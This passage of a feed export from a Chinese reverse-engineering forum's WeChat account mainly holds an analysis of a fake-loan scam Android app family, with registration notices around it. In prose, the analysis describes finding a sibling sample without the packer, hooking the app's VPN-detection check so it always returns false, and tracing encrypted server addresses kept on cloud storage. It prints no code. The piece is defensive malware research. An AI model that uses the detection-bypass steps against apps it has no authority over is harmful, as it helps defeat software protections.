rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140730&amp;idx=1&amp;sn=35c28447e545cfca350016102548d63b&amp;chksm=bd50a22e8a272b3820b8289e4b53222643fa91a8f1fc1a06328f73c3f2572d771cc051659d44&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十九、表哥，你也不想你的Frida被检测吧!(下)</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141015&amp;idx=1&amp;sn=f5e09409bc7c21d76f924e57754ece4f&amp;chksm=bd50a3c38a272ad56480f610a8ab36830d2a87765b5df9398ffc90feb6cb147232570c45e21b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》二十课、抓包学得好，牢饭吃得饱(上)</a><br /></span><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" style="color: rgb(68, 68, 68); cursor: pointer;" target="_blank"></a><br /></p><p>[原创]Flutter概述和逆向技术发展时间线，带你快速了解blutterreFlutter[翻译]Flutter 逆向初探[原创]一种基于frida和drony的针对flutter抓包的方法Android-Flutter逆向<br />Flutter Android APP 逆向系列 (一)</p><p><span><br /></span></p><p><span>详细文字介绍、视频原件下载、视频所用到的程序下载、课后作业和学习交流参看论坛原文：</span></p><p><span>https://www.52pojie.cn/thread-1951619-1-1.html</span></p><p><span><br /></span></p><p><span style="font-size: 24px;"><span style="color: rgb(255, 0, 0);">点击左下角“阅读原文”，</span><strong><span style="color: rgb(255, 0, 0);">进入 <em>B站 </em>在</span></strong></span><span style="color: rgb(255, 0, 0); font-size: 24px;"><strong>线观看视频教程，</strong>欢迎一键三连转发</span><span style="font-size: 24px; color: rgb(255, 0, 0);">~</span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.bilibili.com/video/BV1LH4y1c7cS">阅读原文</a></p>
<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=d1bc23fe&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141046%26idx%3D1%26sn%3D9aca0e7944652654d970b582336d8f52%26chksm%3Dbd50a3e28a272af47da389fe562367a254a194f9f9e258471cd016e680d1e839d2e1420fd91e%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Wed, 07 Aug 2024 18:08:32 +0800</pubDate>
</item>
<item>
<title>【移动样本分析】移动端假冒借贷，诈骗APP病毒家族逆向</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141040&amp;idx=1&amp;sn=3bd58f858a3caf70ecb633f2b66d3c8a&amp;chksm=bd50a3e48a272af2749eb324526f5a215b483f749211611dcd69f69e2b9163090fcea8852703&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141040&amp;idx=1&amp;sn=3bd58f858a3caf70ecb633f2b66d3c8a&amp;chksm=bd50a3e48a272af2749eb324526f5a215b483f749211611dcd69f69e2b9163090fcea8852703&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-30 11:01</span> <span style="display: inline-block;">北京</span>
</p>

<p>最新又遇到一个移动端假冒借贷诈骗APP病毒家族，今天来搞一搞。还是老样子只分析网络行为，过程写的比较啰嗦，主要是分享思路和研究成果，讨论技术问题。样本不传，只展示目录结构。环境及工具：夜神模拟器Android9、算法助手、JADX、小黄鸟。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=80585ab5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNbW8IotSUjo6ia2Q5d1YHA3MMicEtn6ZouneP6bX6SbFApyypSU40ybbw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal; font-size: 24px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px; letter-spacing: normal;">作者论坛账号：fengyutongzhou</span></strong></span><br /></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><br /></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>最新又遇到一个移动端假冒借贷诈骗APP病毒家族，今天来搞一搞。还是老样子只分析网络行为，过程写的比较啰嗦，主要是分享思路和研究成果，讨论技术问题。此文章无向导，无结论。样本不传，只展示目录结构。环境及工具：夜神模拟器Android9、算法助手、JADX、小黄鸟。</span><br /><img class="rich_pages wxw-img" height="1000" src="https://wechat2rss.xlab.app/img-proxy/?k=419ccbd1&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNJpotjhYxiaOF9RnbW4oEwic77t0BvV7SFOicl9BjTpmkPZes4Zficpc7Pw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="563" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>如图所示小黄鸟代理抓包会弹窗，不仅会弹窗，APP自身还不触发联网。</span><br /><img class="rich_pages wxw-img" height="1000" src="https://wechat2rss.xlab.app/img-proxy/?k=d4d5ff3d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNTgBPSrFL3FeEVx61hibHHDMEjFoibOscN9CyB3511d3VIPpJr60UnZPA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="563" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>MT管理器查看有壳是360加固。其实可以放弃了，不过换一种渗透思维，尝试找个同族无壳样本不就OK了。</span><br /><img class="rich_pages wxw-img" height="1000" src="https://wechat2rss.xlab.app/img-proxy/?k=9e046aab&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNicZ37knbVkO3hmFs2OibZTflpEzkH6L6zj1X28wjzlibHkZicZPJMmkDww%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="563" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>这个同族没壳，开搞。</span><br /><img class="rich_pages wxw-img" height="1000" src="https://wechat2rss.xlab.app/img-proxy/?k=2908d2fa&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNeXROv88CZYrwIeWQibBwaL7cRXjcXdvq6AOyWHs3MNqAsoz9uUZbIbw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="563" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>这是有壳那个样本，显示弹窗的栈是c.k.b.d.a.e.c</span><br /><img class="rich_pages wxw-img" height="1000" src="https://wechat2rss.xlab.app/img-proxy/?k=e07fed74&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKN6fj0yT8dicKEpeAa0YticdvogKOHw1ibbawjVPowHY4L2WFdnzvXqP2eg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="563" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>这是无壳样本，弹窗栈是c.j.b.d.a.e.c</span><br /><img class="rich_pages wxw-img" height="1000" src="https://wechat2rss.xlab.app/img-proxy/?k=964f9cbb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNWY0icOtnOmdGaziaSNvWIVfK3QFouo72WWDQGaibTVaKDduY9nQ6bJJzQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="496" /><span></span><br /><span>JADX反编译看一下目录结构妥妥的混淆</span><br /><img class="rich_pages wxw-img" height="279" src="https://wechat2rss.xlab.app/img-proxy/?k=e84b3ade&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNmFbxtTTguGJ88Z52kTDe3TgAk6Zmd1WamcplJOSufHKkrknBPIePUw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>定位无壳样本弹窗类，c.j.b.d.a.e类</span><br /><img class="rich_pages wxw-img" height="649" src="https://wechat2rss.xlab.app/img-proxy/?k=7e3ce048&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNjoQd0LVoMwlHyTNubG6KgXOW59nswGU2INQHR19XkC84pQ92StjHPQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>找到方法c，这个方法主要就是判断网络配置，</span><span><span style="font-family: Consolas;">C2398a.f7576a.m2732b</span></span><span><span style="font-family: Consolas;">先判断</span></span><span><span style="font-family: Consolas;">ture</span></span><span><span style="font-family: Consolas;">或</span></span><span><span style="font-family: Consolas;">flase</span></span><span><span style="font-family: Consolas;">，</span></span><span><span style="font-family: Consolas;">ture</span></span><span><span style="font-family: Consolas;">的话就执行弹窗，下面其他的网络判断操作都不执行，</span></span><span>双击m2732b跟进代码。</span><br /><img class="rich_pages wxw-img" height="955" src="https://wechat2rss.xlab.app/img-proxy/?k=cfd26132&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNy9yDzBL7dzEYZmHmsf6c2gREdZcEA2BiaDXHqQJr80wJiazqs95ibFr5Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>主要是这里判断是否启用了VPN。</span><br /><img class="rich_pages wxw-img" height="1000" src="https://wechat2rss.xlab.app/img-proxy/?k=0a829e6e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKN9BwquIFNt3CUUvpxCibVKoBheCib9DAm0IZbicA1I5iaibmT6OzctQAEaww%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="563" /><span></span><br /><span>来到最新版算法助手v2.1.2，创建一个HOOK脚本，让c.j.b.d.d.a.b函数无论如何都返回false。就可以了。</span><br /><img class="rich_pages wxw-img" height="1000" src="https://wechat2rss.xlab.app/img-proxy/?k=76befa2a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKN7GW7JwSxRmxHnKJJSekk7fkb4cZ5xYbMV26fHkDdQ0uFpTAmwQM71Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="562" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>来到有壳的样本看效果，拦截c.k.b.d.d.a.b函数，成功。</span><br /><img class="rich_pages wxw-img" height="754" src="https://wechat2rss.xlab.app/img-proxy/?k=d98d0ac3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNibXFrjWiaOPR2bCldl7PkjLXp7k2H2mTuF6RnxIAyKStickFSsJCwAo1g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>这下有壳样本也搞定了，看到正常抓包，弹窗也没了。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=a9b3c3b4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNfNiaCEJ2gwLKdtE1ljrcdT22aiaWbYSwJmRcssr91ibhLLia6mQOXExeUw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><span></span><br /><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>分析一下网络行为，APP分别去myqcloud、阿里云OSS、亚马逊云，请求了资源文件。先说为什么，其实就是把URL加密后存在云上，主要是隐藏APP服务器地址。或者是进行线路冗余。这段操作有点像之前树蚺家族利用OSS存储服务来隐藏节点。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=8b2967ac&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLc302LNxrxpI6jHT5VXnKNm7CYnblibBx8ezMkMBB2UlRJoEKX7vIAI8J0ic31LiaF8ZCCFoiafsvsjg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="814" /></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span><br /></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><span>算法助手HOOK，显示加密的内容为RSA加密。之后拿着密钥和密文来进行解密就可以把所有IP节点解密。</span></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: normal;"><br /></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1945195-1-1.html">阅读原文</a></p>
<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=4875fc5e&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141040%26idx%3D1%26sn%3D3bd58f858a3caf70ecb633f2b66d3c8a%26chksm%3Dbd50a3e48a272af2749eb324526f5a215b483f749211611dcd69f69e2b9163090fcea8852703%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Tue, 30 Jul 2024 11:00:57 +0800</pubDate>
</item>
<item>
<title>暑假开放注册四小时共注册23219人，没有激活的同学请尽快激活啦，发帖前请认真阅读注册须知和总版规，防止违规封号注销。

刚加入的同学请经常登录并保持活跃（注意：签到不算活跃，只有发帖或回帖才算，这句话很重要），参与到论坛交流中来，对于给予帮助你的人加热心和论坛币，做一个热心受欢迎的人。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141021&amp;idx=1&amp;sn=fc91d4b2b083c6f3a0805b9aa101b53e&amp;chksm=bd50a3c98a272adf716ee4f2122ae584a311bdd587de25c2e86f34b9806ba78e80db75e8f06f&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141021&amp;idx=1&amp;sn=fc91d4b2b083c6f3a0805b9aa101b53e&amp;chksm=bd50a3c98a272adf716ee4f2122ae584a311bdd587de25c2e86f34b9806ba78e80db75e8f06f&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span>吾爱pojie</span> <span>2024-07-22 11:57</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>

<div class="profile_area_hide" id="js_top_profile"><div class="wx_follow_context wx_follow_primary wx_follow_smart wx_follow_top " id="follow_placeholder"><div class="wx_follow_media weui-flex weui-flex_align-center "><div class="wx_follow_hd "><img class="wx_follow_avatar " src="http://mmsns.qpic.cn/mmsns/LFPriaSjBUZKGJ6e3ahOG8KFMaic9NIoicZ52tP0YFAgsQjwWjialyl8GQ/300" /></div> <div class="wx_follow_bd weui-flex__item "><div class="wx_follow_info "><div class="wx_follow_nickname ">吾爱破解论坛</div></div></div></div></div></div> <div class="share_notice js_share_notice_dom  "><!----> </div> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <!----> <div class="rich_media_meta_list "><div class="rich_media_meta_area_primary "><!----> <!----> </div> <div class="rich_media_meta_area_extra "><span class="rich_media_meta rich_media_meta_text " id="publish_time"></span>  <span class="rich_media_meta rich_media_meta_text " id="js_ip_wording_wrp" style="display: none;"><span id="js_ip_wording"></span></span></div></div>




<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=a0f72484&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141021%26idx%3D1%26sn%3Dfc91d4b2b083c6f3a0805b9aa101b53e%26chksm%3Dbd50a3c98a272adf716ee4f2122ae584a311bdd587de25c2e86f34b9806ba78e80db75e8f06f%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Mon, 22 Jul 2024 11:56:45 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年7月21日暑假开放注册公告即将开始 12：00 -- 14：00 和 20：00 -- 22：00。

赶不上的定个晚间闹钟吧，新通知会在B站继续发布。

推荐使用电脑注册，可以使用论坛的诊断修复工具修复一次，方便提前解决注册中可能会遇到的问题，如果修复后还是不行建议尽快更换设备尝试。

注册页面会强制10分钟来阅读注册须知，须知中包括了你注册现在和未来可能会遇到的问题，请仔细阅读，否则可能无法注册成功或注册后被清理。

另：开放注册期间暂停签到任务、下载论坛附件功能、默认搜索功能、QQ登录绑定等功能（忘记账号密码可以邮箱重置后登陆） 请各位知晓。主要把下载附件的带宽和服务器负载节省下来供用户注册访问使用，等注册结束就恢复了（默认搜索功能根据论坛负载压力预计一周左右恢复），请大家谅解。另外新注册的会员需要注册一天后才可以发帖，以缓解注册压力。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141019&amp;idx=1&amp;sn=d18326a91ba743dec4b7bc517e87b420&amp;chksm=bd50a3cf8a272ad9789a0b352c60dfa63eb24f57fe7f5f16d215fb26b40ae3c23e63d07be417&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141019&amp;idx=1&amp;sn=d18326a91ba743dec4b7bc517e87b420&amp;chksm=bd50a3cf8a272ad9789a0b352c60dfa63eb24f57fe7f5f16d215fb26b40ae3c23e63d07be417&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span>吾爱pojie</span> <span>2024-07-21 11:21</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>

<div class="profile_area_hide" id="js_top_profile"><div class="wx_follow_context wx_follow_primary wx_follow_smart wx_follow_top " id="follow_placeholder"><div class="wx_follow_media weui-flex weui-flex_align-center "><div class="wx_follow_hd "><img class="wx_follow_avatar " src="http://mmsns.qpic.cn/mmsns/LFPriaSjBUZKGJ6e3ahOG8KFMaic9NIoicZ52tP0YFAgsQjwWjialyl8GQ/300" /></div> <div class="wx_follow_bd weui-flex__item "><div class="wx_follow_info "><div class="wx_follow_nickname ">吾爱破解论坛</div></div></div></div></div></div> <div class="share_notice js_share_notice_dom  "><!----> </div> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <!----> <div class="rich_media_meta_list "><div class="rich_media_meta_area_primary "><!----> <!----> </div> <div class="rich_media_meta_area_extra "><span class="rich_media_meta rich_media_meta_text " id="publish_time"></span>  <span class="rich_media_meta rich_media_meta_text " id="js_ip_wording_wrp" style="display: none;"><span id="js_ip_wording"></span></span></div></div>




<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=0affabe6&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141019%26idx%3D1%26sn%3Dd18326a91ba743dec4b7bc517e87b420%26chksm%3Dbd50a3cf8a272ad9789a0b352c60dfa63eb24f57fe7f5f16d215fb26b40ae3c23e63d07be417%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Sun, 21 Jul 2024 00:56:49 +0800</pubDate>
</item>
<item>
<title>暑假开放注册微信抽奖活动，再送40个账号注册码或300论坛币，下午两点开奖，详见：【开放注册公告】吾爱破解论坛2024年7月21日暑假开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141017&amp;idx=1&amp;sn=057c483892bc8fea3b431f088b0da0dd&amp;chksm=bd50a3cd8a272adb224aea0e388a679203cc9633523d32769f7ecae305b055e426a345b59d52&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141017&amp;idx=1&amp;sn=057c483892bc8fea3b431f088b0da0dd&amp;chksm=bd50a3cd8a272adb224aea0e388a679203cc9633523d32769f7ecae305b055e426a345b59d52&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-07-20 08:27</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>

<div class="profile_area_hide" id="js_top_profile"><div class="wx_follow_context wx_follow_primary wx_follow_smart wx_follow_top " id="follow_placeholder"><div class="wx_follow_media weui-flex weui-flex_align-center "><div class="wx_follow_hd "><img class="wx_follow_avatar " src="http://mmsns.qpic.cn/mmsns/LFPriaSjBUZKGJ6e3ahOG8KFMaic9NIoicZ52tP0YFAgsQjwWjialyl8GQ/300" /></div> <div class="wx_follow_bd weui-flex__item "><div class="wx_follow_info "><div class="wx_follow_nickname ">吾爱破解论坛</div></div></div></div></div></div> <div class="share_notice js_share_notice_dom  "><!----> </div> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <!----> <div class="rich_media_meta_list "><div class="rich_media_meta_area_primary "><!----> <!----> </div> <div class="rich_media_meta_area_extra "><span class="rich_media_meta rich_media_meta_text " id="publish_time"></span>  <span class="rich_media_meta rich_media_meta_text " id="js_ip_wording_wrp" style="display: none;"><span id="js_ip_wording"></span></span></div></div>




